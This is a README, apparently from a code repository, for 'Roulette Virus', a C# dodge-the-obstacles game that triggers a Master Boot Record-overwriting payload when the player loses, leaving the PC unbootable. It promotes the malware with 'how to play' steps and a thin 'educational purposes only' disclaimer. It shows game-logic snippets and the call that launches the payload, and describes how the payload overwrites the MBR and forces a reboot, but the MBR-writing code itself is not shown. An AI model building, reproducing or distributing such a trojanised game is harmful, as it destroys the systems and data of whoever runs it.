# 🎰 Roulette Virus - The Ultimate Gamble

## ⚠️ Disclaimer
**WARNING:** This project is for **educational purposes only**! 🚨 The creator, "ABOLHB" from the Mason Group, does **not** take any responsibility for any misuse of this code. Running this program can permanently damage your system. **DO NOT USE THIS MALICIOUSLY.**

---

## 🎮 About the Game
Roulette Virus is a game where you play a high-stakes survival challenge. If you **lose**, the game will execute an MBR (Master Boot Record) virus that can render your system unbootable! 😈💀

**Developer:** ABOLHB 🏴‍☠️
**Group:** Mason Group 🏛️
**Language:** C# 🖥️

---

## 🔥 How It Works
- You control a small player icon 🏃
- Avoid obstacles to survive 🚧
- The game gets harder as you progress ⏳
- If you lose all your hearts ❤️❌, the game triggers the **MBR virus** 🚀
- The virus will overwrite the Master Boot Record, making the PC unable to start 😵

---

## 📜 Code Breakdown
### **1. Game Initialization**
The game is built using **Windows Forms (WinForms)** and relies on:
- **Graphics (GDI+)** for rendering visuals 🎨
- **Timers** to control game events ⏲️
- **Keyboard input** for movement ⌨️

```csharp
public partial class GAME : Form
```
This initializes the **game window** and sets up the rendering.

---

### **2. Player Controls 🕹️**
The player can move **left, right, up, and down**:
```csharp
if (e.KeyCode == Keys.Left) { playerX -= playerSpeed; }
if (e.KeyCode == Keys.Right) { playerX += playerSpeed; }
if (e.KeyCode == Keys.Up) { playerY -= playerSpeed; }
if (e.KeyCode == Keys.Down) { playerY += playerSpeed; }
```

**Game Start & Pause**:
```csharp
if (!gameStarted) { gameStarted = true; }
if (e.KeyCode == Keys.Space) { paused = !paused; }
```

---

### **3. Obstacles & Collision 🚧**
Obstacles appear randomly on the screen, and if the player touches them, they lose a heart ❤️:
```csharp
if (playerRect.IntersectsWith(obs.Rect)) { playerHearts--; }
```
If the player's hearts reach **0**, the **game over** event is triggered.

---

### **4. The Ultimate Punishment - MBR Virus Execution 💀**
If the player loses, the **MBR virus payload is triggered**:
```csharp
if (playerHearts <= 0) {
    gameOver = true;
    gameTimer.Stop();
    Task.Factory.StartNew(() => GDI.MasonGDI());
}
```
**`GDI.MasonGDI()`** is a function that starts the payload, which manipulates the system’s Master Boot Record, making the PC unbootable.

---

## ❗ Why is This Dangerous?
The **MBR (Master Boot Record)** is a crucial part of a computer's storage system. It contains the information required to load the OS. If this gets corrupted, **the computer will not start!**

The game exploits this by:
1. **Overwriting the MBR sector** 📝
2. **Replacing it with malicious code** 💀
3. **Triggering a forced reboot** 🔄

Once executed, the computer will show an error like:
```
No Bootable Device Found
```
Or **it will display a custom message set in the virus payload.**

---

## 🔧 How to Play (If You Dare!)
1. Run the executable ⚙️
2. Survive for as long as possible ⏳
3. Dodge the obstacles 🚧
4. If you lose all hearts, **your system is doomed!** 💀🔥

---

## 🛑 How to Stop It (Damage Control)
If the virus has already executed, you **must**:
1. **Reinstall Windows using a bootable USB/DVD** 💿
2. **Use MBR repair tools (e.g., bootrec.exe /fixmbr)** 🛠️
3. **Backup your data regularly to prevent data loss** 🗄️

---

## ⚠️ LEGAL WARNING
Using this software in a real-world scenario is **highly illegal** and can lead to **severe consequences**, including **legal action** 🚔.

- **DO NOT use this on personal computers.**
- **DO NOT distribute this with malicious intent.**
- **Only run in a **controlled virtual environment** 🖥️.

> 🚨 **YOU HAVE BEEN WARNED!** 🚨

